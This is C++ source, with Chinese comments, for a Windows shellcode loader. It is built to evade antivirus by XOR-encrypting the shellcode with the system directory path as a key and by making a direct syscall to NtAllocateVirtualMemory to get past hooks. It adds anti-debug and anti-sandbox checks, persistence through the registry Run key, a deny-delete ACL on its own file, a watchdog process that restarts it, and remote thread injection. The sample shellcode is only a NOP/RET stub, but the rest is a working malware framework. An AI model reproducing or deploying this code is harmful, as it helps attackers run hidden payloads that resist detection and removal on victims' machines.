#include <windows.h>
#include <aclapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>

#define GCC

// 对于mingw32编译器要使用编译参数`-mwindows`哦。
#ifdef VS_STUDIO
#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")
#endif

#define REG_NAME "test_sc_loader"
#define WATCHDOG_NAME "watchdog.exe"
#define CHECK_DELAY 256

// 加密字符串长度。
int KEY_LENGTH = 19;
bool end_flag = false;
// shellcode 包含 NOP 和 RET shellcode的示例。（对"C:\Windows\system32"循环异或后）
/* shellcode 包含 NOP 和 RET shellcode的示例。（明文）
unsigned char shellcode[] = {
    0x90, // NOP
    0xC3  // RET
};
*/
unsigned char shellcode[] = {
    0xa8, 0xc4,
};
char syscall_allocvm_name[] = {
    0xd,0x4e,0x1d,0x3b,0x5,0x1,0x7,0xe,0x3,0x16,0xa,0x1a,0xb,0x7,0x1,0x4,0x1,0x7e,0x57,0x2e,0x55,0x2e,0x2e,0x69
};

extern "C" VOID syscallWarpper(DWORD id);
extern "C" VOID do_syscall(...);

char* getSystemDirectory(char* path) {
    // 对几乎全部Windows用户这个函数必然会把path改为:" "。而这可以作为动态密钥使用以达到免杀目的捏。
    if (GetSystemDirectoryA(path, MAX_PATH) != 0) {
        return path;
    } else {
        throw std::runtime_error("Unable to get system directory.");
    }
}

void xorEncode(char* data, char* key, long length_data, long length_key) {
    for (long i = 0; i < length_data; ++i) {
        data[i] = data[i] ^ key[i % length_key];
    }
}

bool iSDaclContainDeleteDenyAce(PACL pDacl, PSID pSid) {
    ACL_SIZE_INFORMATION aclSizeInfo;
    ZeroMemory(&aclSizeInfo, sizeof(ACL_SIZE_INFORMATION));

    if (!GetAclInformation(pDacl, &aclSizeInfo, sizeof(ACL_SIZE_INFORMATION), AclSizeInformation)) {
        std::cerr << "Failed to get ACL information. Error: " << GetLastError() << std::endl;
        return false;
    }

    for (DWORD i = 0; i < aclSizeInfo.AceCount; i++) {
        PACE_HEADER pAceHeader = NULL;
        if (GetAce(pDacl, i, (LPVOID*)&pAceHeader)) {
            if (pAceHeader->AceType == ACCESS_DENIED_ACE_TYPE) {
                PACCESS_DENIED_ACE pAce = (PACCESS_DENIED_ACE)pAceHeader;
                if ((pAce->Mask & DELETE) && EqualSid(&pAce->SidStart, pSid)) {
                    return true;
                }
            }
        }
    }

    return false;
}

int denyDelete(){
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    PSID pSid = NULL;
    PACL pOldDacl = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;

    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);

    DWORD dwBufferSize = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize);
    PTOKEN_USER pTokenUser = (PTOKEN_USER)malloc(dwBufferSize);

    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)) {
        std::cerr << "Failed to get token information. Error: " << GetLastError() << std::endl;
        return 1;
    }

    pSid = pTokenUser->User.Sid;

    if (GetNamedSecurityInfo(exePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, &pOldDacl, NULL, &pSD) != ERROR_SUCCESS) {
        std::cerr << "Failed to get security info. Error: " << GetLastError() << std::endl;
        return -1;
    }

    if (iSDaclContainDeleteDenyAce(pOldDacl, pSid)) {
        std::cout << "The delete-deny ACE already exists." << std::endl;
    } else {
        EXPLICIT_ACCESS ea;
        ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
        ea.grfAccessPermissions = DELETE;
        ea.grfAccessMode = DENY_ACCESS;
        ea.grfInheritance = NO_INHERITANCE;
        ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        ea.Trustee.ptstrName = (LPTSTR)pSid;

        PACL pNewDacl = NULL;
        if (SetEntriesInAcl(1, &ea, pOldDacl, &pNewDacl) != ERROR_SUCCESS) {
            std::cerr << "Failed to set entries in ACL. Error: " << GetLastError() << std::endl;
            LocalFree(pSD);
            return -1;
        }

        if (SetNamedSecurityInfo(exePath, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pNewDacl, NULL) != ERROR_SUCCESS) {
            std::cerr << "Failed to set security info. Error: " << GetLastError() << std::endl;
            LocalFree(pNewDacl);
            LocalFree(pSD);
            return -1;
        }

        std::cout << "Successfully added delete-deny ACE." << std::endl;
        LocalFree(pNewDacl);
    }

    LocalFree(pSD);
    free(pTokenUser);
    CloseHandle(hToken);

    return 1;
}

void addToStartup() {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    const char* keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = REG_NAME;

    HKEY hKey;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        if (RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1) == ERROR_SUCCESS) {
            std::cout << "Successfully added to startup." << std::endl;
        } else {
            std::cerr << "Failed to set registry value." << std::endl;
        }
        RegCloseKey(hKey);
    } else {
        std::cerr << "Failed to open registry key." << std::endl;
    }
}

BOOLEAN StartProcess(const std::string path, const std::string args, PROCESS_INFORMATION &pi) {
    STARTUPINFO si = { sizeof(si) };
    std::string cmdline = path + " " + args;
    if (CreateProcess(NULL, &cmdline[0], NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
        std::cout << "Create process succeed.\n";
        return true;
    }
    std::cout << "Create process faild:" << GetLastError() << std::endl;
    return false;
}

BOOL ConsoleHandler(DWORD signal) {
    switch (signal) {
        case CTRL_LOGOFF_EVENT:
            addToStartup();
            break;
        case CTRL_SHUTDOWN_EVENT:
            addToStartup();
            break;
        default:
            return 0;
    }
    return 1;
}

DWORD WINAPI childSaver(LPVOID lpParam) {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    PROCESS_INFORMATION piSaver;
    std::string fullPath(exePath);
    size_t lastBackslashPos = fullPath.find_last_of("\\/");
    std::string directory = fullPath.substr(0, lastBackslashPos + 1);
    std::string newFullPath = directory + WATCHDOG_NAME;
    BOOL copyResult = CopyFile(exePath, newFullPath.data(), FALSE);

    while (true)
    {
        if(StartProcess(copyResult?newFullPath:exePath,std::to_string(GetCurrentProcessId())+" "+exePath,piSaver)){
            while (true)
            {
                DWORD waitResult = WaitForSingleObject(piSaver.hProcess, CHECK_DELAY);
                if(waitResult == WAIT_OBJECT_0){
                    std::cout << "Saver killed." << std::endl;
                    CloseHandle(piSaver.hProcess);
                    CloseHandle(piSaver.hThread);
                    break;
                }
                if(end_flag){
                    TerminateProcess(piSaver.hProcess,0);
                    break;
                }
            }
        }
        if(end_flag){
            TerminateProcess(piSaver.hProcess,0);
            break;
        }
    }
    return 0;
}

void* getNtDllBase(){
    // 结构体随着Windows版本不同似乎会有变化捏。
    // 从GS寄存器的0x60偏移量读取PEB（进程环境块）地址。
    ULONG64 peb = __readgsqword(0x60);
    // 从PEB的0x18偏移量读取PEB_LDR_DATA结构的地址。
    ULONG64 ldr = *(ULONG64*)(peb + 0x18);
    // 从PEB_LDR_DATA的0x10偏移量读取模块加载顺序列表的头指针。
    PLIST_ENTRY mod_list = *(PLIST_ENTRY*)(ldr + 0x10);
    // 从模块列表的第一个模块的Flink指针偏移0x30处读取ntdll.dll模块的基地址。
    return *(void **)((ULONG64)mod_list->Flink + 0x30);
}

int getSystemCallIndex(char* syscall_name, char* key, long name_length){
    BYTE* ntdll_base = (BYTE*)getNtDllBase();
    PIMAGE_DOS_HEADER p_dos = (PIMAGE_DOS_HEADER)ntdll_base;
    PIMAGE_FILE_HEADER p_file = (PIMAGE_FILE_HEADER)(ntdll_base + p_dos->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER p_optional = (PIMAGE_OPTIONAL_HEADER)((BYTE*)p_file + IMAGE_SIZEOF_FILE_HEADER);
    PIMAGE_EXPORT_DIRECTORY p_export = (PIMAGE_EXPORT_DIRECTORY)(ntdll_base + p_optional->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD number_of_func = p_export->NumberOfFunctions;
    DWORD number_of_name = p_export->NumberOfNames;

    DWORD* p_eat = (DWORD*)(ntdll_base + p_export->AddressOfFunctions);
    DWORD* p_ent = (DWORD*)(ntdll_base + p_export->AddressOfNames);
    WORD* p_eit = (WORD*)(ntdll_base + p_export->AddressOfNameOrdinals);

    xorEncode(syscall_name, key, name_length, KEY_LENGTH);

    for(size_t i = 0; i < number_of_func; i++) {
        for(size_t j = 0; j < number_of_name; j++) {
            if(i == p_eit[j]) {
                BYTE* fn_name = (BYTE*)(ntdll_base + p_ent[j]);
                if(strcmp((char*)fn_name, syscall_name) == 0) {
                    return *(DWORD*)(ntdll_base + p_eat[i] + 4);
                }
            }
        }
    }
    return -1;
}

BOOL InjectFunction(DWORD processId, void* function, SIZE_T functionSize, uint64_t arg) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        return FALSE;
    }

    void* pRemoteFunction = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteFunction == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pRemoteFunction, function, functionSize, NULL)) {
        VirtualFreeEx(hProcess, pRemoteFunction, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
        (LPTHREAD_START_ROUTINE)pRemoteFunction, 
        (LPVOID)arg, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, pRemoteFunction, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteFunction, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 1;
}

POINT getMousePosition() {
    POINT pt;
    GetCursorPos(&pt);
    return pt;
}

void antiSandBox() {
    std::cout << "Waiting for mouse movement..." << std::endl;
    time_t startTime = time(nullptr);
    POINT initialPosition = getMousePosition();
    
    while (true) {
        POINT currentPosition = getMousePosition();
        if (currentPosition.x != initialPosition.x || currentPosition.y != initialPosition.y) {
            return;
        }
        Sleep(CHECK_DELAY);
    }
}

int main(int argc, char *argv[]) {
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);
    denyDelete();
    // 反调试
    if(IsDebuggerPresent()){
        return -1;
    }

    if (argc==1) {
        HANDLE hThreadSaver = CreateThread(
            NULL,
            0,
            childSaver,
            NULL,
            0,
            NULL
        );

        addToStartup();

        if (!SetConsoleCtrlHandler(ConsoleHandler, TRUE)) {
            std::cerr << "Error: Could not set control handler\n";
            return -1;
        }
        // 获取动态密钥
        char path[MAX_PATH] = {};
        try {
            getSystemDirectory(path);
        } catch (const std::exception& e) {
            std::cerr << "Get system directory error: " << e.what() << std::endl;
            return -1;
        }

        antiSandBox();
        // 创建一个具备可执行和可写属性的内存页面(手动调用绕过ring3 HOOK检测)
        HANDLE process_handle = GetCurrentProcess();
        SIZE_T region_size = sizeof(shellcode);
        ULONG allocation_type = MEM_COMMIT | MEM_RESERVE;
        ULONG protect = PAGE_EXECUTE_READWRITE;
        ULONG_PTR zeroBits = 0;
        syscallWarpper((DWORD)getSystemCallIndex(syscall_allocvm_name,path,sizeof(syscall_allocvm_name)));
        PVOID exec_mem = NULL;
        do_syscall(process_handle,&exec_mem,zeroBits,&region_size,allocation_type,protect);

        // void* exec_mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec_mem == nullptr) {
            std::cerr << "Error while allocating memory." << std::endl;
            return -1;
        }

        // 将 shellcode 解密后写入内存页面
        xorEncode((char*)shellcode, path, sizeof(shellcode), KEY_LENGTH);
        memcpy(exec_mem, shellcode, sizeof(shellcode));

        // 跳转到 shellcode 执行
        ((void(*)())exec_mem)();

        // 释放内存页面
        VirtualFree(exec_mem, 0, MEM_RELEASE);

        std::cout << "End." << std::endl;
        // 确保Shellcode自己能结束自己.
        end_flag = true;
        Sleep(2*CHECK_DELAY);
    } else {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, std::stoull(argv[1]));
        if (hProcess == NULL) {
            std::cerr << "Failed to open process: " << GetLastError() << std::endl;
            return -1;
        }
        while (true)
        {
            DWORD waitResult = WaitForSingleObject(hProcess, INFINITE);
            if(waitResult == WAIT_OBJECT_0){
                std::cout << "Main killed." << std::endl;
                CloseHandle(hProcess);
                break;
            }
        }
        PROCESS_INFORMATION pi;
        StartProcess(argv[2],"",pi);
        return 0;
    }
    return 0;
}
